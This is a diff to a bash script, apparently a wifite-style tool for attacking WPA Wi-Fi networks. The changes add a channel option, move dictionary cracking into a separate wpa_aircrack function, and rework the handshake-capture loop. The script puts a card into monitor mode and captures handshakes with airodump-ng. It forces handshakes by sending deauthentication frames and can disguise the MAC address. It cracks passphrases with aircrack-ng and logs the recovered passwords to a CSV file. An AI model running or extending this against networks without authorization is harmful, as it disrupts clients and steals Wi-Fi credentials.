@@ -21,6 +21,7 @@ EOF
 cat << EOF | column -s\& -t
 -d|--dict & Specificy dictionary to use when cracking WPA.
 -m|--mac & Change wireless's mac address with an anonymize mac.
+-c|--channel & Channel to scan for targets.
 -h|--help & Display Help
 EOF
 
@@ -145,7 +146,7 @@ handshake_check(){
     echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
     2>/dev/null | grep -q 'Passphrase not in dictionary'
     if [ $? -eq 0 ];then
-        handshake_sig=0
+        # handshake_sig=0
         kill -15 ${airodump_pid[0]}
         stop_monitor_mode ${iface}
         apbssid=$(echo ${ap_bssid} | tr ":" "-")
@@ -156,31 +157,36 @@ handshake_check(){
             ${CURRENT_DIR}/cap2hccapx.bin ${cap_file}.cap ${cap_file}.hccapx &>/dev/null
         fi
         echo -e "Success!saved as ${cap_file}.cap"
-        if [ ! -z ${dict_file} ];then
-            aircrack-ng -a 2 -w ${dict_file} -l ${temp_dir}/wpakey.txt \
-            -b ${ap_bssid} ${cap_file}.cap
-            if [ -f ${temp_dir}/wpakey.txt ];then
-                password=$(cat ${temp_dir}/wpakey.txt)
-                echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
-            fi
-        else
-            exit 0
-        fi
+        return 0
+    else
+        return 1
+    fi
+}
+
+wpa_aircrack(){
+    if [ ${dict_file} ];then
+        su ${user} -c "aircrack-ng -a 2 -w ${dict_file} -l \
+        ${temp_dir}/wpakey.txt -b ${ap_bssid} ${cap_file}.cap"
+    else
+        exit 0
+    fi
+    if [ -f ${temp_dir}/wpakey.txt ];then
+        password=$(cat ${temp_dir}/wpakey.txt)
+        echo "${ap_ssid},${apbssid},${password}" >> ${cracked_csv}
     fi
 }
 
 initialization(){
     confirm_run_as_root
+    user=$(who | awk '{print $1}')
     program_exist
     iwconfig 2>/dev/null | grep -E '^[^ ]+ ' | awk '{print $1}' | while read line;do
         stop_monitor_mode ${line}
     done
-    CURRENT_DIR=$(cd `dirname $0`;pwd)
-    cd ${CURRENT_DIR}
-    handshake_sig=1
+    # handshake_sig=1
     temp_dir=${CURRENT_DIR}/temp
     [ -d ${temp_dir} ] || mkdir -p ${temp_dir}
-    [ -d ${temp_dir} ] && rm -rf ${temp_dir}/*
+    [ -d ${temp_dir} ] && chmod 777 ${temp_dir} && rm -rf ${temp_dir}/*
     cap_dir=${CURRENT_DIR}/handshake
     [ -d ${cap_dir} ] || mkdir -p ${cap_dir}
     cracked_csv=${CURRENT_DIR}/cracked.csv
@@ -194,7 +200,13 @@ scan_interface(){
     [ -n ${iface_origin_mac} ] && start_monitor_mode ${iface}
     sleep 1
     iface=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}')
-    airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite ${iface}
+    airodump_cmd=(airodump-ng -a --write-interval 1 -w ${temp_dir}/wifite)
+    if [ ${channel} ];then
+        airodump_cmd[${#airodump_cmd[@]}]='-c'
+        airodump_cmd[${#airodump_cmd[@]}]=${channel}
+    fi
+    airodump_cmd[${#airodump_cmd[@]}]=${iface}
+    ${airodump_cmd[*]}
 }
 
 wpa_attack(){
@@ -214,25 +226,37 @@ wpa_attack(){
     sleep 5
     airodump_pid=($(ps -ef | grep '^root.*airodump-ng' | awk '{print $2}'))
     while true;do
-        handshake_check
-        [ ${handshake_sig} -eq 0 ] && break
+        handshake_check && break
+        # [ ${handshake_sig} -eq 0 ] && break
         send_deauth
     done
 }
+
+CURRENT_DIR=$(cd `dirname $0`;pwd)
+cd ${CURRENT_DIR}
 
 while true;do
     case $1 in
         -d|--dict)
         if [ -r $2 ];then
-            dict_file=$2
+            dict_file=${CURRENT_DIR}/${2##*/}
         else
             echo "Can't find dictionary,file $2 don't exist" 1>&2
             echo "Option $1 must be an exist dictionary file" 1>&2
-            exit 0
+            exit 1
         fi
         shift;;
         -m|--mac)
         mac_change=0;;
+        -c|--channel)
+        expr $2 + 0 &>/dev/null
+        if [ $? -eq 0 ];then
+            [[ $2 -ge 1 && $2 -le 13 ]] && channel=$2
+        else
+            echo "Option $1 must be a number between 1-13" 1>&2
+            exit 1
+        fi
+        shift;;
         -h|--help)
         usage
         exit 0;;
@@ -249,3 +273,4 @@ done
 initialization
 scan_interface
 wpa_attack
+wpa_aircrack
